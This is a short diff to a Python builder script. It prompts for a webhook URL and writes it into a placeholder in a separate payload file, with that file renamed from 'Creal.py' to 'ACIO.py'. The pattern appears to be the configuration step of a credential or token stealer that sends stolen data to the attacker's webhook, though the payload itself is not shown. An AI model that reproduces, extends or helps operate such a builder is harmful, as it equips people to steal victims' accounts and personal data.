@@ -52,11 +52,11 @@ while True:
         os.system("cls || clear")
         webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)
 
-        filename = "Creal.py"
+        filename = "ACIO.py"
         filepath = os.path.join(os.getcwd(), filename)
         with open(filepath, "r", encoding="utf-8") as f:
             content = f.read()
-        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
+        new_content = content.replace('"WEBHOOK-HERE"', f'"{webhook}"')
         with open(filepath, "w", encoding="utf-8") as f:
             f.write(new_content)
         Write.Print(f"\n{filename} file updated.", Colors.green_to_white)
